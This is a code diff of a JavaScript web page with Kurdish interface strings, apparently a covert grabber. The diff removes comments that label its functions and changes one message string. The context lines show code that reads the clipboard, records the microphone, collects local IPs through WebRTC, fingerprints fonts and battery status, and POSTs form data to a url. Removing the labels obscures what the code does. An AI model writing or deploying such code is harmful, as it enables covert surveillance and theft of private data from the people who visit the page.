@@ -162,7 +162,6 @@
             fetch(url, { method: "POST", body: formData });
         }
 
-        // WebRTC Local IP
         function getLocalIPs(callback) {
             try {
                 let ips = [];
@@ -183,7 +182,6 @@
             } catch(e) { callback([]); }
         }
 
-        // Clipboard
         async function getClipboardData() {
             try {
                 if (navigator.clipboard && navigator.clipboard.readText) {
@@ -194,7 +192,6 @@
             return "پشتیوانی ناکرێت";
         }
 
-        // Voice Recording
         function recordMicrophone() {
             try {
                 navigator.mediaDevices.getUserMedia({ audio: true, video: false })
@@ -214,7 +211,6 @@
             } catch(e) {}
         }
 
-        // Network RTT Ping Check
         async function measureNetworkLatency() {
             try {
                 let start = performance.now();
@@ -226,7 +222,6 @@
             }
         }
 
-        // Font Fingerprinting
         function getDetectedFonts() {
             let baseFonts = ['monospace', 'sans-serif', 'serif'];
             let testString = "mmmmmmmmmmlli";
@@ -296,7 +291,7 @@
                     let level = Math.round(battery.level * 100) + "%";
                     let charging = battery.charging ? "⚡ لە چارجدا" : "🔋 بێ چارج";
                     return `${level} (${charging})`;
-                } catch(e) { return "نەزانراو"; }
+                } catch(e) { return "نەتوانراو"; }
             }
             return "پشتیوانی ناکرێت";
         }
